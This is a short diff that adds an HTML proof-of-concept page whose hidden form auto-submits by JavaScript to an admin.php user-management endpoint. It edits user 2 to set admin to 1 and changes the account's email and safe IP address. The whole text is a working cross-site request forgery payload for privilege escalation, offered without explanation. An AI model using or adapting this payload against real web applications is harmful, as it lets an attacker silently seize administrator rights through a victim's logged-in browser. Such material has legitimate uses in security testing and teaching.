@@ -1,0 +1,10 @@
+<form name="xssform" action="http://127.0.0.1/admin.php?cat=users" method="post">
+<input type="hidden" name="userid" value="2" />
+<input type="hidden" name="email" value="bob@aol.com" />
+<input type="hidden" name="admin" value="1" />
+<input type="hidden" name="safe_ip" value="10.0.100.100" />
+<input type="hidden" name="edit_user" />
+</form>
+<script>
+document.xssform.submit();
+</script>
